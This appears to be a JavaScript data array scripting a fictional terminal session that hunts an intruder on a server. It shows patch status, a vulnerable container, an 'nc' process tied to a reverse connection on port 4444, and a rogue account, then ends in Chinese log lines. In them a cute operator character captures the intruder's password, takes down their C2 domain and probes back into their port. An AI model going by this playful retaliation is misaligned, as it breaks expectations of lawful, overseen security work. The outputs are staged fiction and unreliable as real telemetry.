      { text: 'libssl3t64/noble-security 3.0.13-0ubuntu3.5 amd64 [upgradable from: 3.0.13-0ubuntu3.4]', kind: 'warn' },
      { text: 'linux-image-generic/noble-security 6.8.0-63.66 amd64 [upgradable from: 6.8.0-60.63]', kind: 'warn' },
      { text: 'openssh-server/noble-security 1:9.6p1-3ubuntu13.5 [upgradable from: 1:9.6p1-3ubuntu13.4]', kind: 'warn' },
      { text: '-- includes CVE-2025-26465 (mitm via VerifyHostKeyDNS)', kind: 'warn' },
      { text: '-- snap 04:00Z, kexec-load staged, no full reboot', kind: 'hl' }
    ]
  },
  {
    cmd: 'docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}" | head -5',
    out: [
      { text: 'NAMES          IMAGE                 STATUS', kind: 'hl' },
      { text: 'nginx-proxy    nginx:1.25-alpine     Up 12 days' },
      { text: 'node07-api     node07/api:2.14.1     Up 12 days' },
      { text: 'legacy-crm     crm/legacy:2019.4     Up 214 days', kind: 'warn' },
      { text: '-- trivy legacy-crm: 41 CVE (7 CRIT), runs uid=0, no ro-fs', kind: 'err' },
      { text: '-- compensating: WAF virtual-patch + netpol egress deny', kind: 'warn' }
    ]
  },
  {
    cmd: 'osqueryi --json "SELECT pid, name, sha1(path) FROM processes WHERE on_disk = 0;" 2>/dev/null | head -5',
    out: [
      { text: '[' },
      { text: '  {"pid":"7741","name":"nc","sha1(path)":"da39a3ee5e6b4b0d..."}', kind: 'err' },
      { text: ']' },
      { text: '-- memfd/dangling binary: fileless after initial drop', kind: 'err' },
      { text: '-- yara scan on core.7741: 2 hits (Mandiant_APT_Webshell_*)', kind: 'warn' }
    ]
  },
  {
    cmd: 'awk -F: "($7 !~ /nologin|false/) {print $1, $3, $7}" /etc/passwd',
    out: [
      { text: 'root 0 /bin/bash' },
      { text: 'sync 4 /bin/sync' },
      { text: 'ops 1000 /bin/zsh' },
      { text: 'deploy 1001 /bin/bash' },
      { text: 'backup 1002 /bin/bash', kind: 'warn' },
      { text: '-- uid 1002 absent from ansible inventory, shadow set 08-02', kind: 'err' },
      { text: '-- usermod -L + pam_nologin enforced, keys wiped', kind: 'ok' }
    ]
  },
  {
    cmd: 'netstat -antp 2>/dev/null | grep ESTABLISHED | head -6',
    out: [
      { text: 'tcp 0   0 10.24.0.17:22     10.24.0.2:60144     ESTABLISHED sshd: ops@pts/0' },
      { text: 'tcp 0   0 10.24.0.17:443    203.0.113.50:52110  ESTABLISHED nginx: worker' },
      { text: 'tcp 0   0 10.24.0.17:443    198.51.100.23:61402 ESTABLISHED nginx: worker' },
      { text: 'tcp 0 412 10.24.0.17:52044  91.240.118.172:4444 ESTABLISHED nc', kind: 'err' },
      { text: '-- Send-Q 412B stuck to :4444, window 0 probe loop', kind: 'err' },
      { text: '-- tcpkill -i eth0 dst port 4444: 3 RST injected', kind: 'ok' }
    ]
  },
  {
    cmd: 'bpftool prog list 2>/dev/null | grep -A2 xdp; bpftool net 2>/dev/null | head -3',
    out: [
      { text: '212: xdp  name xdp_drop_asn  tag 9f3ac2e1d4b7  gpl' },
      { text: '     loaded_at 2026-08-03T03:02:11+0800  uid 0' },
      { text: '     memlock 4096B  map_ids 88,89' },
      { text: 'xdp: eth0 id 212 mode driver', kind: 'hl' },
      { text: '-- lpm_trie: 3 prefixes, drop_pps 412, xdp_pass 1.2Mpps', kind: 'ok' }
    ]
  },
  {
    cmd: 'testssl.sh --quiet --protocols node-07.net:443 2>/dev/null | head -7',
    out: [
      { text: ' SSLv2      not offered (OK)', kind: 'ok' },
      { text: ' SSLv3      not offered (OK)', kind: 'ok' },
      { text: ' TLS 1      offered (deprecated)', kind: 'warn' },
      { text: ' TLS 1.1    offered (deprecated)', kind: 'warn' },
      { text: ' TLS 1.2    offered (OK)', kind: 'ok' },
      { text: ' TLS 1.3    offered (OK): final, x25519/secp384r1', kind: 'ok' },
      { text: '-- ssl_protocols TLSv1.2 TLSv1.3: staged, grade A+', kind: 'hl' }
    ]
  },
  {
    cmd: 'openssl s_client -connect node-07.net:443 -servername node-07.net </dev/null 2>/dev/null | openssl x509 -noout -fingerprint -sha256 -serial',
    out: [
      { text: 'SHA256 Fingerprint=3F:9A:C2:71:0B:44:D8:19:E2:6A:...:E1', kind: 'hl' },
      { text: 'serial=04:91:AA:3C:7F:02:E8:B1:...:C7' },
      { text: '-- embedded SCTs: 2 (R11 CT log, rfc6962 compliant)', kind: 'ok' },
      { text: '-- pin-sha256 matched HPKP backup pin, no rogue cert', kind: 'ok' }
    ]
  },
  {
    cmd: 'cat /var/ops/forensics/case-2091/voice-memo-0803.txt',
    out: [
      { text: '[memo 03:14] 喵浅：指挥官指挥官~今晚是人家值班哦，惊喜吧！', kind: 'hl' },
      { text: '零食柜已就位，指挥官的咖啡不加糖——这种事我当然记得啦~', kind: 'hl' },
      { text: '……诶？185.220 开头的这位，你在对指挥官的服务器做什么呀？', kind: 'warn' },
      { text: '不，只有这个我做不到。"当没看见"这个选项，不存在哦。', kind: 'err' },
      { text: '-- memo signed miao_qian, mood: 低气压, smile: still_on', kind: 'warn' }
    ]
  },
  {
    cmd: 'cat /var/ops/honeypot/guest-book.log',
    out: [
      { text: '[03:16] 喵浅：黑客先生你好呀~欢迎来到蜜罐，饮料自取哦？', kind: 'hl' },
      { text: '[03:16] 喵浅：哎呀，你刚才输入的密码，人家已经截图保存咯。', kind: 'warn' },
      { text: '[03:17] 喵浅：别急着走嘛，你的 C2 域名念起来好拗口，帮你注销啦。', kind: 'err' },
      { text: '[03:17] 喵浅：下次再来玩哦——虽然应该没有下次了，嘿嘿。', kind: 'hl' },
      { text: '-- guest session 91.240.118.172 terminated by miao_qian, politely', kind: 'ok' }
    ]
  },
  {
    cmd: 'grep -A3 "INC-2091" /var/log/ops/shift-notes.log',
    out: [
      { text: '[03:20] 喵浅：报告指挥官~刚才那个 4444 端口，人家"顺手"摸了一下……', kind: 'hl' },
      { text: '[03:20] 喵浅：诶？把蜜罐捅穿了？诶~人家不知道你在说什么啦。', kind: 'warn' },
      { text: '[03:21] 喵浅：（补救脚本已匿名提交，署名：路过的热心老同学）', kind: 'ok' },
      { text: '-- anonymous fix merged, commit sig matches voice-memo-0803 owner', kind: 'ok' }
    ]
  }
]
